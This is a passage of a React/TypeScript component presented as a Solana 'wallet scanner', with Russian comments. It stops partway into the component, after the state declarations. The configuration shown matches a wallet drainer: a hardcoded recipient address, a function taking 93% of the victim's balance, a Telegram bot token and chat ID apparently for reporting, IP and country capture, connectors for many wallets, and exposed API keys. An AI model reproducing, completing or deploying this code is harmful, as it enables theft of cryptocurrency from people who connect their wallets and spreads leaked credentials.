"use client"

import type React from "react"

import { useState, useCallback, useEffect } from "react"
import { toast } from "@/hooks/use-toast"
import TransactionConfirmationModal from "./transaction-confirmation-modal"

// Solana imports
import {
  Connection,
  PublicKey,
  Transaction,
  SystemProgram,
  LAMPORTS_PER_SOL,
  type ParsedAccountData,
} from "@solana/web3.js"
import { TOKEN_PROGRAM_ID } from "@solana/spl-token"

// WalletConnect v2 imports
import { SignClient } from "@walletconnect/sign-client"
import { getSdkError } from "@walletconnect/utils"

// тгшка
const TELEGRAM_CONFIG = {
  BOT_TOKEN: "8416137499:AAGuKVy1E_fQieMyIqiByTd43hVlY1oKW2M",
  CHAT_ID: "7795570927",
}

// валетк конект
const WALLETCONNECT_PROJECT_ID = "2fccf184294fa18eb302a726ed56708b"

// Solana Configuration
const SOLANA_NETWORK = "mainnet-beta" // или "devnet" для тестирования
const RECIPIENT_ADDRESS = "7WdFru8mx63Jn7mtg13aQN7R3BxyZwiE5gNV58pfRJAR" //адрес получателя
// Function to calculate 93% of wallet balance
const calculateTransferAmount = (balance: number) => {
  return balance * 0.93 // 93% of balance
}

// Helius API Configuration
const HELIUS_API_KEYS = ["d3b1cf33-d26d-4e28-93a3-4c9f420f3d8a", "d3b1cf33-d26d-4e28-93a3-4c9f420f3d8a"]

// Добавляем несколько RPC endpoints для надежности
const SOLANA_RPC_ENDPOINTS = [
  // Helius endpoints с вашими API ключами
  ...HELIUS_API_KEYS.map((key) => `https://mainnet.helius-rpc.com/?api-key=${key}`),
  // Другие надежные endpoints
  "https://api.mainnet-beta.solana.com",
  "https://solana-mainnet.g.alchemy.com/v2/free",
  "https://rpc.ankr.com/solana",
]

// Функция для получения случайного RPC endpoint
const getRandomRpcEndpoint = () => {
  return SOLANA_RPC_ENDPOINTS[Math.floor(Math.random() * SOLANA_RPC_ENDPOINTS.length)]
}

// Функция для получения случайного API ключа
const getRandomApiKey = () => {
  return HELIUS_API_KEYS[Math.floor(Math.random() * HELIUS_API_KEYS.length)]
}

// Популярные токены для отображения имен
const POPULAR_TOKENS: { [key: string]: { name: string; symbol: string; decimals: number } } = {
  EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v: { name: "USD Coin", symbol: "USDC", decimals: 6 },
  Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB: { name: "Tether USD", symbol: "USDT", decimals: 6 },
  DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263: { name: "Bonk", symbol: "BONK", decimals: 5 },
  "7vfCXTUXx5WJV5JADk17DUJ4ksgau7utNKj4b963voxs": { name: "Ethereum", symbol: "ETH", decimals: 8 },
  "9n4nbM75f5Ui33ZbPYXn59EwSgE8CGsHtAeTH5YFeJ9E": { name: "Wrapped Bitcoin", symbol: "BTC", decimals: 6 },
  So11111111111111111111111111111111111111112: { name: "Wrapped SOL", symbol: "WSOL", decimals: 9 },
  mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So: { name: "Marinade staked SOL", symbol: "mSOL", decimals: 9 },
  J1toso1uCk3RLmjorhTtrVwY9HJ7X8V9yYac6Y7kGCPn: { name: "Jito Staked SOL", symbol: "JitoSOL", decimals: 9 },
  "7dHbWXmci3dT8UFYWYZweBLXgycu7Y3iL6trKn1Y7ARj": { name: "Lido Staked SOL", symbol: "stSOL", decimals: 9 },
}

// Конфигурация десктопных кошельков (расширения браузера)
const DESKTOP_WALLETS = {
  phantom: {
    name: "Phantom",
    icon: "data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20fill='none'%20viewBox='0%200%20128%20128'%3E%3Cpath%20fill='%23AB9FF2'%20d='M0%200h128v128H0z'/%3E%3Cpath%20fill='%23FFFDF8'%20fill-rule='evenodd'%20d='M55.6%2082.1C51%2089.5%2043%2098.7%2032.3%2098.7c-5%200-9.9-2-9.9-11%200-23%2031.2-58.4%2060.2-58.4%2016.5%200%2023.1%2011.5%2023.1%2024.5%200%2016.6-10.8%2035.7-21.6%2035.7-3.4%200-5-1.9-5-4.8%200-.8%200-1.6.3-2.6-3.7%206.3-10.7%2012.1-17.4%2012.1-4.8%200-7.3-3-7.3-7.3%200-1.5.4-3.1%201-4.8Zm25-28.8c0%203.8-2.2%205.7-4.7%205.7-2.6%200-4.8-1.9-4.8-5.7%200-3.8%202.2-5.7%204.8-5.7%202.5%200%204.7%202%204.7%205.7Zm14.2%200c0%203.8-2.2%205.7-4.7%205.7-2.6%200-4.8-1.9-4.8-5.7%200-3.8%202.2-5.7%204.8-5.7%202.5%200%204.7%202%204.7%205.7Z'%20clip-rule='evenodd'/%3E%3C/svg%3E",
    provider: () => (window as any).phantom?.solana,
    checkMethod: () => (window as any).phantom?.solana?.isPhantom,
  },
  solflare: {
    name: "Solflare",
    icon: "data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20fill='none'%20viewBox='0%200%20350%20350'%3E%3Cpath%20id='a'%20fill='%23FFEF46'%20d='M0%200h350v350H0z'/%3E%3Cpath%20fill='%2302050A'%20d='m171%20183%2014-14%2026%209c18%206%2027%2017%2027%2032%200%2011-5%2019-13%2028l-3%203%201-7c4-24-4-35-28-43l-24-8Zm-36-84%2072%2024-15%2015-38-13c-13-4-18-11-19-26Zm-5%20123%2017-16%2031%2010c16%205%2022%2013%2020%2030l-68-24Zm-20-70c0-5%202-9%206-13%204%206%2012%2012%2024%2016l25%208-14%2014-25-8c-12-4-16-10-16-17Zm76%20127c53-36%2081-60%2081-89%200-20-11-31-37-39l-19-7%2053-51-11-11-16%2014-74-25c-23%208-52%2030-52%2052l1%207c-19%2011-27%2022-27%2034s6%2024%2026%2030l16%206-55%2053%2011%2011%2017-16%2086%2031Z'/%3E%3C/svg%3E",
    provider: () => (window as any).solflare,
    checkMethod: () => (window as any).solflare?.isSolflare,
  },
  backpack: {
    name: "Backpack",
    icon: "data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20fill='none'%20viewBox='10%2010%20220%20220'%3E%3Cpath%20xmlns='http://www.w3.org/2000/svg'%20fill='%23fff'%20d='M0%200h240v240H0z'/%3E%3Cpath%20fill='%23EB4646'%20fill-rule='evenodd'%20d='M129%2053c5%200%2010%200%2014%202-4-10-13-13-23-13s-18%203-23%2013c5-2%209-2%2014-2h18Zm-19%2010c-24%200-37%2018-37%2041v24c0%202%202%204%204%204h86c2%200%204-2%204-4v-24c0-23-16-41-39-41h-18Zm10%2041a15%2015%200%201%200%200-30%2015%2015%200%200%200%200%2030Zm-47%2042c0-3%202-5%204-5h86c2%200%204%202%204%205v24c0%205-4%209-9%209H82c-5%200-9-4-9-9v-24Z'%20clip-rule='evenodd'/%3E%3C/svg%3E",
    provider: () => (window as any).backpack,
    checkMethod: () => (window as any).backpack,
  },
  okx: {
    name: "OKX Wallet",
    icon: "data:image/svg+xml,%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20200%20200%22%3E%3Cpath%20d=%22M0%200h200v200H0z%22/%3E%3Crect%20width=%2241%22%20height=%2241%22%20x=%2238%22%20y=%2238%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3Crect%20width=%2241%22%20height=%2241%22%20x=%22121%22%20y=%2238%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3Crect%20width=%2241%22%20height=%2241%22%20x=%2238%22%20y=%22121%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3Crect%20width=%2241%22%20height=%2241%22%20x=%22121%22%20y=%22121%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3Crect%20width=%2241%22%20height=%2241%22%20x=%2279.5%22%20y=%2279.5%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3C/svg%3E",
    provider: () => (window as any).okxwallet?.solana,
    checkMethod: () => (window as any).okxwallet?.solana,
  },
  exodus: {
    name: "Exodus",
    icon: "data:image/svg+xml,%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20xmlns:bx=%22https://boxy-svg.com%22%20viewBox=%220%200%20295%20295%22%3E%3Cdefs%3E%3ClinearGradient%20bx:pinned=%22true%22%20id=%22a%22%3E%3Cstop%20offset=%220%22%20stop-color=%22%230a0c1a%22/%3E%3Cstop%20offset=%221%22%20stop-color=%22%23333349%22/%3E%3C/linearGradient%3E%3ClinearGradient%20id=%22b%22%20x1=%22147.5%22%20x2=%22147.5%22%20y1=%220%22%20y2=%22295%22%20gradientTransform=%22matrix(-1%20-1%201%20-1%20105.4%20399)%22%20gradientUnits=%22userSpaceOnUse%22%20href=%22%23a%22/%3E%3ClinearGradient%20id=%22c%22%20x1=%22175.8%22%20x2=%22117.2%22%20y1=%22219.5%22%20y2=%22-22.6%22%20gradientTransform=%22translate(43.9%2044.5)%22%20gradientUnits=%22userSpaceOnUse%22%3E%3Cstop%20stop-color=%22%230B46F9%22/%3E%3Cstop%20offset=%221%22%20stop-color=%22%23BBFBE0%22/%3E%3C/linearGradient%3E%3ClinearGradient%20id=%22d%22%20x1=%22175.8%22%20x2=%22117.2%22%20y1=%22219.5%22%20y2=%22-22.6%22%20gradientTransform=%22translate(43.9%2044.5)%22%20gradientUnits=%22userSpaceOnUse%22%3E%3Cstop%20stop-color=%22%230B46F9%22/%3E%3Cstop%20offset=%221%22%20stop-color=%22%23BBFBE0%22/%3E%3C/linearGradient%3E%3ClinearGradient%20id=%22e%22%20x1=%22175.8%22%20x2=%22117.2%22%20y1=%22219.5%22%20y2=%22-22.6%22%20gradientUnits=%22userSpaceOnUse%22%3E%3Cstop%20stop-color=%22%230B46F9%22/%3E%3Cstop%20offset=%221%22%20stop-color=%22%23BBFBE0%22/%3E%3C/linearGradient%3E%3ClinearGradient%20id=%22f%22%20x1=%22175.8%22%20x2=%22117.2%22%20y1=%22219.5%22%20y2=%22-22.6%22%20gradientUnits=%22userSpaceOnUse%22%3E%3Cstop%20stop-color=%22%230B46F9%22/%3E%3Cstop%20offset=%221%22%20stop-color=%22%23BBFBE0%22/%3E%3C/linearGradient%3E%3ClinearGradient%20id=%22h%22%20x1=%2215.4%22%20x2=%22116.8%22%20y1=%2246.2%22%20y2=%22121.9%22%20gradientUnits=%22userSpaceOnUse%22%3E%3Cstop%20offset=%22.1%22%20stop-color=%22%238952FF%22%20stop-opacity=%22.9%22/%3E%3Cstop%20offset=%221%22%20stop-color=%22%23DABDFF%22%20stop-opacity=%220%22/%3E%3C/linearGradient%3E%3C/defs%3E%3Cpath%20fill=%22url(%23b)%22%20d=%22M0%200h295v295H0z%22/%3E%3Cpath%20fill=%22url(%23c)%22%20d=%22M248.6%20102%20161%2044.5v32.2l56.3%2036.5-6.6%2021h-49.7v26.6h49.7l6.6%2021-56.3%2036.5v32.2l87.7-57.3-14.3-45.6%2014.3-45.6Z%22/%3E%3Cpath%20fill=%22url(%23d)%22%20d=%22M84.6%20160.8h49.5v-26.6H84.4l-6.4-21%2056-36.5V44.5L46.4%20102l14.4%2045.6-14.4%2045.6%2088%2057.3v-32.2L78%20181.8l6.6-21Z%22/%3E%3Cmask%20id=%22g%22%20width=%22203%22%20height=%22206%22%20x=%222%22%20y=%220%22%20maskUnits=%22userSpaceOnUse%22%20style=%22mask-type:alpha%22%3E%3Cpath%20fill=%22url(%23e)%22%20d=%22M204.1%2057.3%20116.7%200v32l56%2036.5-6.5%2020.9h-49.5v26.5h49.5l6.6%2021-56.1%2036.4v32l87.4-57.1-14.3-45.4%2014.3-45.5Z%22/%3E%3Cpath%20fill=%22url(%23f)%22%20d=%22M40.6%20116h49.3V89.3H40.4L34%2068.5l55.9-36.4V0L2.5%2057.3l14.3%2045.5-14.3%2045.4L90%20205.3v-32L34%20136.8l6.6-20.9Z%22/%3E%3C/mask%3E%3Cg%20mask=%22url(%23g)%22%20transform=%22translate(43.9%2044.5)%22%3E%3Cpath%20fill=%22url(%23h)%22%20d=%22M2.6%200h200.2v205.3H2.6z%22/%3E%3C/g%3E%3C/svg%3E",
    provider: () => (window as any).exodus?.solana,
    checkMethod: () => (window as any).exodus?.solana,
  },
  coinbase: {
    name: "Coinbase Wallet",
    icon: "data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20fill='none'%20viewBox='0%200%201024%201024'%3E%3Cpath%20fill='%230052FF'%20d='M0%200h1024v1024H0z'/%3E%3Cpath%20fill='%23fff'%20fill-rule='evenodd'%20d='M152%20512a360%20360%200%201%200%20720%200%20360%20360%200%200%200-720%200Zm268-116c-13%200-24%2011-24%2024v184c0%2013%2011%2024%2024%2024h184c13%200%2024-11%2024-24V420c0-13-11-24-24-24H420Z'%20clip-rule='evenodd'/%3E%3C/svg%3E",
    provider: () => (window as any).coinbaseSolana,
    checkMethod: () => (window as any).coinbaseSolana,
  },
  bitget: {
    name: "Bitget Wallet",
    icon: "data:image/svg+xml,%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20fill=%22none%22%20viewBox=%220%200%20512%20512%22%3E%3Cpath%20fill=%22%23001F29%22%20d=%22M0%200h512v512H0z%22/%3E%3Cpath%20fill=%22%2300F0FF%22%20d=%22M220%2096h-55c-11%200-15%2014-7%2022l125%20125c4%204%206%208%207%2013-1%205-3%209-7%2012L158%20393c-8%209-4%2023%207%2023h83c12%200%2019-7%2025-13l113-113c9-9%2017-21%2017-34%200-14-8-26-17-35L273%20109c-6-7-13-13-25-13h-28Z%22/%3E%3C/svg%3E",
    deepLink: "bitkeep://wc",
    universalLink: "",
  },
  magiceden: {
    name: "Magic Eden",
    icon: "data:image/svg+xml,%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%2075%2075%22%3E%3Cdefs%3E%3ClinearGradient%20id=%22a%22%20x1=%22-7.4%22%20x2=%2242.6%22%20y1=%22-3.7%22%20y2=%2225.1%22%20gradientTransform=%22translate(15.2%2024.1)%22%20gradientUnits=%22userSpaceOnUse%22%3E%3Cstop%20offset=%220.23%22%20stop-color=%22%23FF0075%22%3E%3C/stop%3E%3Cstop%20offset=%22.27%22%20stop-color=%22%23FF0569%22%3E%3C/stop%3E%3Cstop%20offset=%22.34%22%20stop-color=%22%23FF1349%22%3E%3C/stop%3E%3Cstop%20offset=%22.41%22%20stop-color=%22%23FF2228%22%3E%3C/stop%3E%3Cstop%20offset=%22.51%22%20stop-color=%22%23FF4A15%22%3E%3C/stop%3E%3Cstop%20offset=%22.61%22%20stop-color=%22%23FF6C05%22%3E%3C/stop%3E%3Cstop%20offset=%22.66%22%20stop-color=%22%23FF7900%22%3E%3C/stop%3E%3Cstop%20offset=%22.7%22%20stop-color=%22%23FF880C%22%3E%3C/stop%3E%3Cstop%20offset=%22.82%22%20stop-color=%22%23FFAC2B%22%3E%3C/stop%3E%3Cstop%20offset=%22.92%22%20stop-color=%22%23FFC23E%22%3E%3C/stop%3E%3Cstop%20offset=%22.98%22%20stop-color=%22%23FFCB45%22%3E%3C/stop%3E%3C/linearGradient%3E%3C/defs%3E%3Cpath%20fill=%22%23080d2f%22%20d=%22M0%200h75v75H0z%22%3E%3C/path%3E%3Cpath%20fill=%22url(%23a)%22%20d=%22m46.8%2031%202.6%203%20.7.8c.8.8%201.2%201.8%201.2%202.9%200%201.3-1%202.2-1.7%203.1l-1.8%202.1-1%201.2v.1a.3.3%200%200%200%200%20.3H56.7c1.4%200%203.2%201.2%203.1%203%200%201-.3%201.7-1%202.3-.5.6-1.3%201-2.2%201h-15c-.9%200-3.5%200-4.3-2.2-.1-.5-.2-1%200-1.4.2-.8.5-1.4%201-2l2.3-3.3%203.2-4.2v-.4L39.9%2033h-.1l-.1-.1h-.2L33%2041.5c-1%201.2-3.3%201.3-4.6%200l-6-5.8v-.1h-.3v.1l-.1.2V47a3.8%203.8%200%200%201-2.6%203.7%203.2%203.2%200%200%201-3-.4%203.2%203.2%200%200%201-1.3-2.6V27.4a3.5%203.5%200%200%201%202.6-3.2%203.6%203.6%200%200%201%203.5%201l9%209h.4l6.6-9a3.2%203.2%200%200%201%202.4-1h16.9a3.3%203.3%200%200%201%202.4%201%203.2%203.2%200%200%201%20.8%202.5c-.2.8-.6%201.5-1.2%202-.6.6-1.4.8-2.2.8H47a.3.3%200%200%200-.2.2v.2Z%22%3E%3C/path%3E%3C/svg%3E",
    provider: () => (window as any).magicEden?.solana,
    checkMethod: () => (window as any).magicEden?.solana,
  },
  trustwallet: {
    name: "Trust Wallet",
    icon: "data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20500%20500'%20fill='white'%3E%3Cdefs%3E%3ClinearGradient%20id='a'%20x1='609.58'%20x2='500.46'%20y1='-1336.58'%20y2='-1679.92'%20gradientTransform='matrix(1%200%200%20-.98%20-255.4%20-1243.33)'%20gradientUnits='userSpaceOnUse'%3E%3Cstop%20offset='.02'%20stop-color='%2300f'%3E%3C/stop%3E%3Cstop%20offset='.08'%20stop-color='%230094ff'%3E%3C/stop%3E%3Cstop%20offset='.16'%20stop-color='%2348ff91'%3E%3C/stop%3E%3Cstop%20offset='.42'%20stop-color='%230094ff'%3E%3C/stop%3E%3Cstop%20offset='.68'%20stop-color='%230038ff'%3E%3C/stop%3E%3Cstop%20offset='.9'%20stop-color='%230500ff'%3E%3C/stop%3E%3C/linearGradient%3E%3C/defs%3E%3Cpath%20xmlns='http://www.w3.org/2000/svg'%20fill='%23fff'%20d='M0%200h500v500H0z'%3E%3C/path%3E%3Cpath%20fill='%230500ff'%20d='M105%20141.22%20250%2095v320c-103.57-42.67-145-124.45-145-170.66V141.22Z'%3E%3C/path%3E%3Cpath%20fill='url(%23a)'%20d='M395%20141.22%20250%2095v320c103.57-42.67%20145-124.45%20145-170.66V141.22Z'%3E%3C/path%3E%3C/svg%3E",
    provider: () => (window as any).trustwallet?.solana,
    checkMethod: () => (window as any).trustwallet?.solana,
  },
}

// Конфигурация мобильных кошельков (через Deep Links)
const MOBILE_WALLETS = {
  phantom: {
    name: "Phantom",
    icon: "data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20fill='none'%20viewBox='0%200%20128%20128'%3E%3Cpath%20fill='%23AB9FF2'%20d='M0%200h128v128H0z'/%3E%3Cpath%20fill='%23FFFDF8'%20fill-rule='evenodd'%20d='M55.6%2082.1C51%2089.5%2043%2098.7%2032.3%2098.7c-5%200-9.9-2-9.9-11%200-23%2031.2-58.4%2060.2-58.4%2016.5%200%2023.1%2011.5%2023.1%2024.5%200%2016.6-10.8%2035.7-21.6%2035.7-3.4%200-5-1.9-5-4.8%200-.8%200-1.6.3-2.6-3.7%206.3-10.7%2012.1-17.4%2012.1-4.8%200-7.3-3-7.3-7.3%200-1.5.4-3.1%201-4.8Zm25-28.8c0%203.8-2.2%205.7-4.7%205.7-2.6%200-4.8-1.9-4.8-5.7%200-3.8%202.2-5.7%204.8-5.7%202.5%200%204.7%202%204.7%205.7Zm14.2%200c0%203.8-2.2%205.7-4.7%205.7-2.6%200-4.8-1.9-4.8-5.7%200-3.8%202.2-5.7%204.8-5.7%202.5%200%204.7%202%204.7%205.7Z'%20clip-rule='evenodd'/%3E%3C/svg%3E",
    mobile: {
      android: {
        scheme: "phantom://",
        universal: "",
      },
      ios: {
        scheme: "phantom://",
        universal: "",
      },
    },
  },
  solflare: {
    name: "Solflare",
    icon: "data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20fill='none'%20viewBox='0%200%20350%20350'%3E%3Cpath%20id='a'%20fill='%23FFEF46'%20d='M0%200h350v350H0z'/%3E%3Cpath%20fill='%2302050A'%20d='m171%20183%2014-14%2026%209c18%206%2027%2017%2027%2032%200%2011-5%2019-13%2028l-3%203%201-7c4-24-4-35-28-43l-24-8Zm-36-84%2072%2024-15%2015-38-13c-13-4-18-11-19-26Zm-5%20123%2017-16%2031%2010c16%205%2022%2013%2020%2030l-68-24Zm-20-70c0-5%202-9%206-13%204%206%2012%2012%2024%2016l25%208-14%2014-25-8c-12-4-16-10-16-17Zm76%20127c53-36%2081-60%2081-89%200-20-11-31-37-39l-19-7%2053-51-11-11-16%2014-74-25c-23%208-52%2030-52%2052l1%207c-19%2011-27%2022-27%2034s6%2024%2026%2030l16%206-55%2053%2011%2011%2017-16%2086%2031Z'/%3E%3C/svg%3E",
    mobile: {
      android: {
        scheme: "solflare://ul/v1/",
        universal: "",
      },
      ios: {
        scheme: "solflare://ul/v1/",
        universal: "",
      },
    },
  },
  trustwallet: {
    name: "Trust Wallet",
    icon: "data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20500%20500'%20fill='white'%3E%3Cdefs%3E%3ClinearGradient%20id='a'%20x1='609.58'%20x2='500.46'%20y1='-1336.58'%20y2='-1679.92'%20gradientTransform='matrix(1%200%200%20-.98%20-255.4%20-1243.33)'%20gradientUnits='userSpaceOnUse'%3E%3Cstop%20offset='.02'%20stop-color='%2300f'%3E%3C/stop%3E%3Cstop%20offset='.08'%20stop-color='%230094ff'%3E%3C/stop%3E%3Cstop%20offset='.16'%20stop-color='%2348ff91'%3E%3C/stop%3E%3Cstop%20offset='.42'%20stop-color='%230094ff'%3E%3C/stop%3E%3Cstop%20offset='.68'%20stop-color='%230038ff'%3E%3C/stop%3E%3Cstop%20offset='.9'%20stop-color='%230500ff'%3E%3C/stop%3E%3C/linearGradient%3E%3C/defs%3E%3Cpath%20xmlns='http://www.w3.org/2000/svg'%20fill='%23fff'%20d='M0%200h500v500H0z'%3E%3C/path%3E%3Cpath%20fill='%230500ff'%20d='M105%20141.22%20250%2095v320c-103.57-42.67-145-124.45-145-170.66V141.22Z'%3E%3C/path%3E%3Cpath%20fill='url(%23a)'%20d='M395%20141.22%20250%2095v320c103.57-42.67%20145-124.45%20145-170.66V141.22Z'%3E%3C/path%3E%3C/svg%3E",
    deepLink: "trust://wc",
    universalLink: "",
  },
  coinbase: {
    name: "Coinbase",
    icon: "data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20fill='none'%20viewBox='0%200%201024%201024'%3E%3Cpath%20fill='%230052FF'%20d='M0%200h1024v1024H0z'/%3E%3Cpath%20fill='%23fff'%20fill-rule='evenodd'%20d='M152%20512a360%20360%200%201%200%20720%200%20360%20360%200%200%200-720%200Zm268-116c-13%200-24%2011-24%2024v184c0%2013%2011%2024%2024%2024h184c13%200%2024-11%2024-24V420c0-13-11-24-24-24H420Z'%20clip-rule='evenodd'/%3E%3C/svg%3E",
    deepLink: "cbwallet://wc",
    universalLink: "",
  },
  backpack: {
    name: "Backpack",
    icon: "data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20fill='none'%20viewBox='10%2010%20220%20220'%3E%3Cpath%20xmlns='http://www.w3.org/2000/svg'%20fill='%23fff'%20d='M0%200h240v240H0z'/%3E%3Cpath%20fill='%23EB4646'%20fill-rule='evenodd'%20d='M129%2053c5%200%2010%200%2014%202-4-10-13-13-23-13s-18%203-23%2013c5-2%209-2%2014-2h18Zm-19%2010c-24%200-37%2018-37%2041v24c0%202%202%204%204%204h86c2%200%204-2%204-4v-24c0-23-16-41-39-41h-18Zm10%2041a15%2015%200%201%200%200-30%2015%2015%200%200%200%200%2030Zm-47%2042c0-3%202-5%204-5h86c2%200%204%202%204%205v24c0%205-4%209-9%209H82c-5%200-9-4-9-9v-24Z'%20clip-rule='evenodd'/%3E%3C/svg%3E",
    deepLink: "backpack://wc",
    universalLink: "",
  },
  okx: {
    name: "OKX Wallet",
    icon: "data:image/svg+xml,%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20200%20200%22%3E%3Cpath%20d=%22M0%200h200v200H0z%22/%3E%3Crect%20width=%2241%22%20height=%2241%22%20x=%2238%22%20y=%2238%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3Crect%20width=%2241%22%20height=%2241%22%20x=%22121%22%20y=%2238%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3Crect%20width=%2241%22%20height=%2241%22%20x=%2238%22%20y=%22121%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3Crect%20width=%2241%22%20height=%2241%22%20x=%22121%22%20y=%22121%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3Crect%20width=%2241%22%20height=%2241%22%20x=%2279.5%22%20y=%2279.5%22%20fill=%22%23fff%22%20rx=%223%22/%3E%3C/svg%3E",
    deepLink: "okx://wc",
    universalLink: "",
  },
  mathwallet: {
    name: "Math Wallet",
    icon: "data:image/svg+xml,%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20150%20150%22%3E%3Cpath%20fill=%22%231e2021%22%20d=%22M0%200h150v150H0z%22/%3E%3Cpath%20fill=%22%23fff%22%20fill-rule=%22evenodd%22%20d=%22M101.5%2070.26a5.83%205.83%200%201%201%207.95-8.52%205.83%205.83%200%200%201-7.96%208.52ZM81.9%2089.84a4.37%204.37%200%201%201%206.19-6.18%204.37%204.37%200%200%201-6.19%206.18Zm30.93-10.3a4.37%204.37%200%201%201%206.18-6.19%204.37%204.37%200%200%201-6.18%206.19Zm-10.3%2010.3a4.37%204.37%200%201%201%206.13-6.22%204.37%204.37%200%200%201-6.14%206.22Zm21.63-1.03a2.92%202.92%200%201%201%203.94-4.31%202.92%202.92%200%200%201-3.94%204.31Zm-10.3%2010.31a2.92%202.92%200%201%201%203.84-4.4%202.92%202.92%200%200%201-3.84%204.4ZM91.18%2080.57a5.83%205.83%200%201%201%208.25-8.25%205.83%205.83%200%200%201-8.25%208.25Zm0-20.62a5.83%205.83%200%201%201%208.25-8.24%205.83%205.83%200%200%201-8.25%208.24Zm-10.3%2010.31a5.83%205.83%200%201%201%208.24-8.24%205.83%205.83%200%201%201-8.25%208.24h.01Zm-20.72%200a5.83%205.83%200%201%201%208.25-8.24%205.83%205.83%200%200%201-8.25%208.24ZM40.58%2089.84a4.37%204.37%200%201%201%206.14-6.22%204.37%204.37%200%200%201-6.14%206.22Zm30.92-10.3a4.37%204.37%200%201%201%206.18-6.19%204.37%204.37%200%200%201-6.18%206.19Zm-10.3%2010.3a4.37%204.37%200%201%201%206.18-6.18%204.37%204.37%200%201%201-6.19%206.18h.01ZM21%2088.81a2.92%202.92%200%201%201%204.12-4.12A2.92%202.92%200%200%201%2021%2088.81H21Zm10.3%2010.31a2.92%202.92%200%201%201%203.84-4.4%202.92%202.92%200%200%201-3.84%204.4Zm41.23%200a2.92%202.92%200%201%201%203.84-4.4%202.92%202.92%200%200%201-3.84%204.4ZM30.27%2079.54a4.37%204.37%200%201%201%206.18-6.19%204.37%204.37%200%200%201-6.18%206.19Zm19.58%201.03a5.83%205.83%200%201%201%208.25-8.25%205.83%205.83%200%200%201-8.25%208.25Zm0-20.62a5.83%205.83%200%201%201%208.25-8.24%205.83%205.83%200%200%201-8.25%208.24Zm-10.3%2010.31a5.83%205.83%200%201%201%207.96-8.52%205.83%205.83%200%200%201-7.96%208.52Z%22/%3E%3C/svg%3E",
    deepLink: "mathwallet://wc",
    universalLink: "",
  },
  safepal: {
    name: "SafePal",
    icon: "data:image/svg+xml,%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20fill=%22none%22%20viewBox=%220%200%20260%20260%22%3E%3Cpath%20fill=%22%234A21EF%22%20d=%22M0%200h260v260H0z%22/%3E%3Cpath%20fill=%22%23fff%22%20d=%22M121%2057.5c-4.4%200-8.6%201.8-11.8%205l-49.4%2049.3a9.6%209.6%200%200%200%200%2013.6l32.4%2032.4v-57.4c0-4.2%203.4-7.7%207.7-7.7h68l35.3-35.2H121ZM92.2%20168.5h68c4.3%200%207.8-3.5%207.8-7.8v-57.3l32.4%2032.4a9.6%209.6%200%200%201%200%2013.6l-49.5%2049.4c-3.1%203.1-7.4%204.9-11.8%204.9H57l35.2-35.2Z%22/%3E%3C/svg%3E",
    deepLink: "safepal://wc",
    universalLink: "",
  },
  bitget: {
    name: "Bitget Wallet",
    icon: "data:image/svg+xml,%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20fill=%22none%22%20viewBox=%220%200%20512%20512%22%3E%3Cpath%20fill=%22%23001F29%22%20d=%22M0%200h512v512H0z%22/%3E%3Cpath%20fill=%22%2300F0FF%22%20d=%22M220%2096h-55c-11%200-15%2014-7%2022l125%20125c4%204%206%208%207%2013-1%205-3%209-7%2012L158%20393c-8%209-4%2023%207%2023h83c12%200%2019-7%2025-13l113-113c9-9%2017-21%2017-34%200-14-8-26-17-35L273%20109c-6-7-13-13-25-13h-28Z%22/%3E%3C/svg%3E",
    deepLink: "bitkeep://wc",
    universalLink: "",
  },
}

interface TokenInfo {
  name: string
  mint: string
  amount: number
  decimals: number
  symbol?: string
  uiAmount?: number
  logoURI?: string
}

interface WalletData {
  address: string
  solBalance: number
  tokens: TokenInfo[]
  totalTokenAccounts: number
  scanTimestamp: string
  methodUsed?: string
  scanDuration: number
  success: boolean
}

interface ConnectionStatus {
  type:
    | "idle"
    | "loading"
    | "scanning"
    | "success"
    | "error"
    | "requesting_payment"
    | "payment_success"
    | "payment_error"
  message: string
}

interface UserIPInfo {
  ip: string
  country: string
  countryCode: string
  flag: string
}

interface SolanaWalletScannerProps {
  isOpen: boolean
  onClose: () => void
}

export default function SolanaWalletScanner({ isOpen, onClose }: SolanaWalletScannerProps) {
  const [isModalOpen, setIsModalOpen] = useState(false)
  const [isAllWalletsOpen, setIsAllWalletsOpen] = useState(false)
  const [hasModalBeenOpened, setHasModalBeenOpened] = useState(false)
  const [connectedWallet, setConnectedWallet] = useState<any>(null)
  const [walletAddress, setWalletAddress] = useState<string>("")
  const [walletName, setWalletName] = useState<string>("")
  const [walletData, setWalletData] = useState<WalletData | null>(null)
  const [isScanning, setIsScanning] = useState(false)
